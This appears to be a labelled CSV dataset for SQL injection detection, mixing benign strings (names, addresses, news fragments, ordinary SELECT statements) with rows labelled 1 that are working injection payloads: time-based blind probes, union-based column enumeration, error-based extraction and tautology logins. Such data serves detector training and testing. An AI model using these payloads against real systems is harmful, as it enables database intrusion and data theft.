Query,Label
Circuit Court Appeals said decisions Judge Shira Scheindlin stayed pending outcome appeal city,0
8616890000000000,0
1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,1
"1  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  8554 = 8554",1
"1"" )  as wehx where 5744 = 5744",1
endoblar,0
kimbroug,0
"Our acts angels are, good ill, Our fatal shadows walk us still",0
"Bwelle , &quot; O &apos;Malley said",0
25270,0
1' )  as oknw where 8777 = 8777,1
equivalentemente,0
"1',  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )",1
"monte campamento 169,",0
"1%""  )  )   )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",1
98726186c,0
oskar,0
SELECT DISTINCT solid FROM help,0
1   )    )    as nwyh where 7100  =  7100,1
"1 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-5245' or elt ( 1032 = 1032,3623 )  and 'qfvo' = 'qfvo",1
-3424'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'dyuo'  =  'dyuo,1
05659,0
torre,0
SELECT * FROM speed FETCH FIRST 50 PERCENT ROWS ONLY,0
"1  )  )   or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"c/ don bosco 65, 10-d",0
melosa,0
SELECT * FROM college ORDER BY jar DESC,0
"1"" where 8333 = 8333",1
travesia de fernando sasiain 35 2?c,0
"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",1
86651591b,0
"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",1
1' in boolean mode )  and 4595 = 4595#,1
since Nixon Administration,0
slezak@ballerpoker.kn,0
38068,0
"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )",1
suchet@ciaplast.tel,0
"1%""   )    )     )   and elt  (  9524  =  1124,1124  )   and    (    (     (  ""%""  =  """,1
SELECT thumb ( s ) FROM element INNER JOIN,0
"’ Rough graceless would greeting, truth handsomer affectation love",0
"select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'",1
decuplar,0
if ( 7340 = 9813 )  select 7340 else drop function yppp--,1
06443,0
"&quot; If want take peaceful stroll along section so-called Cloaca Maxima , &quot; says Schulze , encouraging guests",0
SELECT column_name ( s )  FROM table1 FULL OUTER JOIN,0
"1'  )  )   or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  'tpcm' like 'tpcm",1
conmover,0
55609751y,0
yaser,0
1450,0
Mr Snowden said letter faced &quot; severe sustained &quot; campaign persecution forced home,0
SELECT pleasant ( s )  FROM long SELECT such ( s ),0
9217704235883409,0
compatrn,0
graff@manzanilladevillafafila.iq,0
polli7o,0
"-2067"" or 3038 = 3038",1
"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",1
"iif  (  4460  =  1610,1,1/0  )",1
"Mr Guebuza told AFP , French news agency , Wednesday Mr Dhlakama saw &quot; loser &quot; wanted use &quot; whatever remains forces try prove impose government decisions",0
27002424x,0
"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""%""  =  """,1
"1""  )  )   union all select null,null,null,null,null--",1
"SELECT solveID AS ID, herself AS near FROM owner",0
"SELECT difficultyID AS ID, save AS even FROM highest",0
1   )    )    or pg_sleep  (  __TIME__  )  --,1
8641505731046514,0
1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',1
"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",1
06519,0
23991331p,0
waggoner,0
SELECT * FROM safe WHERE active = 'plural' LIMIT 3,0
c/ coca de la piera 167,0
2938010074996541,0
SELECT * FROM throat ORDER BY cake DESC,0
A study aiming increase benefits Scotland HS2 rail project announced UK government,0
1894425536151221,0
SELECT fairly ( s )  FROM creature FULL OUTER JOIN,0
"1%'   )    )     )   union all select null,null,null,null,null#",1
"paseo mokamer, s/n,",0
"1'||  (  select 'ymwf' where 1229  =  1229 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1
"-9688%'  )  )   )  or elt ( 3695 = 7995,7995 )  and   (  (   ( '%' = '",1
alarcon@24htranslations.cr,0
"&quot; They worry risk pregnancy even handle hygiene , &quot; said Kaplowitz",0
select  ( case when  ( 3677 = 2193 )  then 3677 else 1/ ( select 0 )  end ) --,1
simplemente,0
6317858667918423,0
3040,0
"1'  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  'nbsr' like 'nbsr",1
-4239 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- xacp,1
-6665'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'winx'  =  'winx,1
agostina,0
"SELECT busy, heard+ ', ' + interior+ ' ' + history+ ', ' + usually AS own  FROM team",0
"1%"" )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( ""%"" = """,1
"SELECT street, money+ ', ' + factory+ ' ' + leather+ ', ' + topic AS smoke  FROM stepped",0
admin'or 1  =  1 or ''  =  ',1
0350022340129740,0
9708629316850824,0
SELECT AVG ( correctly ) FROM usually SELECT SUM ( shoot ),0
50100,0
saciedad,0
SELECT * FROM mass WHERE NOT little = 'harder'  AND NOT share = 'automobile',0
"1   )    )    as huxq where 7451  =  7451 union all select null,null,null--",1
"SELECT contrast, men+ ', ' + family+ ' ' + ourselves+ ', ' + thy AS applied  FROM chest",0
"-3270%' or elt ( 9404 = 3498,3498 )  and '%' = '",1
-8753  )   order by 1#,1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_2712' LIMIT 1,0
1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',1
carol,0
' or 1 = 1--,1
praza da constitucion 162,0
1'  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (  'ckmm' like 'ckmm,1
"-9439"" )  where 9460 = 9460 or  ( 9497 = 9586 ) *9586--",1
arabele,0
escobado,0
telly,0
"1  )   as obhj where 1789  =  1789 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
-8876'  )  )   or 3038 = 3038,1
"1""   )    )     )   and 4967  =  8866 and    (    (     (  ""jzyn"" like ""jzyn",1
segu san marful,0
SELECT * FROM fun WHERE due BETWEEN '1996-07-01' AND '1996-07-31',0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'ztmd'  =  'ztmd",1
-7199' or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'qibr' = 'qibr,1
"SELECT IF ( 500<1000, 5, 10 ) ;",0
1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"1   )    )    as hqwy where 4433  =  4433 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
DELETE FROM mud,0
"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"SELECT cold,white,alone,frozen,new     (  (  room JOIN science ON today.somehow =  dark.specific )   INNER JOIN bushON Orders.wire =  church.whistleID )",0
"1""   )    )    as hiuf where 3277  =  3277 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
4.38114E+015,0
e9951r3nte,0
tauja,0
basiano,0
"1   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  1729  =  1729",1
nydia,0
triana,0
gregonio,0
1'||  (  select 'etvo' from dual where 1557  =  1557,1
3sc8r4a8anada,0
"SELECT journey, also, scientificFROM fence WHERE broad  IS NOT NULL",0
"Alfred Abel , currently manages site , arranged &apos; face-lift &apos; cooperation colleague , Reinhard Domke , citizen &apos;s initiative",0
71196230y,0
"At end , Parish Counsellor Michael Schöner Steinach presented new logo pastoral care unit , agreed clear majority",0
"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'ytlf'  =  'ytlf",1
SELECT where ( s )  FROM subject FULL OUTER JOIN,0
"1   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
7542,0
lamarr@tardos.mobi,0
SELECT * FROM floating WHERE magic NOT BETWEEN 'worse' AND 'conversation',0
"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",1
03380,0
3596,0
6608190000000000,0
Henne also mentioned new mother child hospital Nouakchott This particularly interesting time Nagold set away maternity clinic,0
"1"" where 2878 = 2878 union all select null,null,null,null,null#",1
2720340000000000,0
"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",1
"(2001) focus finite state multi-layer perceptron methods, Liu et al",0
select  ( case when  ( 8857 = 1512 )  then 8857 else 8857* ( select 8857 from mysql.db )  end ) #,1
6550423388697055,0
"terque 135, 7-c",0
24604865v,0
"1%""  )  )   )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""%"" = """,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual# gnga",1
select sleep ( 5 )  and 'beuk' = 'beuk,1
18339,0
"joaquin verdaguer, 183",0
-8224'  )   where 6504  =  6504 or 2461  =  5660,1
"1'|| ( select 'mjkz' where 9430 = 9430  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users  )  )  ||'",1
"SELECT proper, thing, shoe FROM him WHERE trunk  IS NULL",0
ricci@redhost.is,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 31078 )  ORDER BY meta_id ASC",0
"-5524 )  as eoyk where 6928 = 6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",1
", 2005; Matusov et al",0
SELECT * FROM soap FETCH FIRST 50 PERCENT ROWS ONLY,0
"-1106'  )  )   union all select 2855,2855,2855,2855,2855,2855,2855#",1
2800093230018510,0
ons,0
-6757'   )    )     )   or 4524  =  3696,1
"&quot; However , type residence choose always personal decision , &quot; explains",0
"""*""",1
DELETE FROM ago WHERE completely = 'upon',0
09899393d,0
Other doctors attending AAP conference reinforced complexities topic,0
1%' )  and 9226 = 7542--,1
potts,0
c/ francisco rodriguez 48,0
SELECT * FROM coal WHERE foot = 'above' FETCH FIRST 3 ROWS ONLY,0
"SELECT CONCAT ( Address, "" "", PostalCode, "" "", City )  AS Address FROM  Customers;",0
"el naranjo, s/n 5f",0
"admin"" or 1  =  1--",1
escritor lopez de cardenas 76 12e,0
raddie,0
SELECT Count ( * )  AS language,0
"1"" )  as ypfa where 6128 = 6128",1
select  ( case when  ( 1868 = 5071 )  then 1 else 1868* ( select 1868 from master..sysdatabases )  end ) --,1
Paul Kaplowitz explained early physical changes quite common among American girls represent new norm,0
49495,0
"However , Dick &apos;s story yet finished",0
-1354   )    )    or 8571  =  8571--,1
"1""  )  )   and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (  ""fbol"" like ""fbol",1
"labiano, s/n 7?a",0
"1"" and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1
coxcojita,0
s4dsudeste,0
SELECT equally FROM reader UNION SELECT gasoline FROM bread ORDER BY boat,0
6015,0
cangalaya,0
79024359q,0
Harkam also played &quot; part &quot; escalation Salzburg Coach Roger Schmidt Grödig Trainer Adi Hütter game,0
"-5143'+  (  select 'zyrr' where 8405  =  8405 union all select 8405,8405,8405,8405#",1
antonino,0
"alqueria de pixarroda, 27",0
"cami can manuel, 117,",0
"As diets change , people get bigger plane seating radically changed",0
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'rgyc'  =  'rgyc,1
"1%""   )    )     )   union all select null#",1
"1  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) -- fzhj",1
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",1
1 rlike sleep ( 5 ) #,1
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_bottom_content' LIMIT 1,0
pascacio,0
1' )  where 5378 = 5378,1
"c/ gravina, s/n",0
"1""   )    )    as xcyo where 2929  =  2929",1
"1%"" )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1
SELECT species ( s )  FROM heart UNION ALL,0
"-1050""  )  )   or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  ""orfo"" like ""orfo",1
SELECT AVG ( Price ) FROM potatoes,0
"Jack Valero Catholic Voices said February , number cardinal electors likely dropped",0
"1'+ ( select 'ewlk' where 1078 = 1078 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
1 and user_name (  )   =  'dbo',1
"1""  )   where 8588  =  8588",1
francisco jorquera s/n 1?d,0
5400,0
ca10a5uda,0
"SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'agent_category', 'agent_city' )  AND tr.object_id IN  ( 28446, 28587, 28591, 28618, 28621, 28633, 28636, 28691, 28696, 28699, 28707, 28710, 28728, 28733 )  ORDER BY t.name ASC",0
"1%""  )  )   )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"Worker falls ladder: seriously injured On Thursday , 51-year-old worker Eggelsberg fell ladder replacing broken external sensor seriously injured",0
te?clear,0
"iif  (  9229  =  4158,1,1/0  )",1
SELECT * FROM entire WHERE chair NOT LIKE 'blanket%',0
16127,0
select case when 8975 = 2352 then 1 else null end--,1
castejn de henares,0
2840010000000000,0
SELECT * FROM greater FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM sold ORDER BY hot,0
SELECT * FROM dirty WHERE listen BETWEEN 'trick' AND 'ordinary',0
"1""  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  ""rurz"" = ""rurz",1
SELECT vessels FROM of,0
"-2896'  )  )   as wisk where 1030 = 1030 union all select 1030,1030,1030,1030#",1
fedro,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'oskf' like 'oskf",1
"1  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  4450 = 4450",1
"Tourism: Descent Romans Beneath Cologne , sewage channel Roman times , measuring around 120 metres length , preserved",0
"1%' or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
SELECT TOP 3 * FROM package WHERE surface = 'mistake' SELECT * FROM learn,0
SELECT * FROM expression 3,0
follett,0
petrie3@menorca.com.kp,0
ta1anta,0
aldeanueva de santa cruz,0
SELECT * FROM apple WHERE test = 'eaten' LIMIT 3,0
castil de vela,0
darcange1,0
&quot; They great team together,0
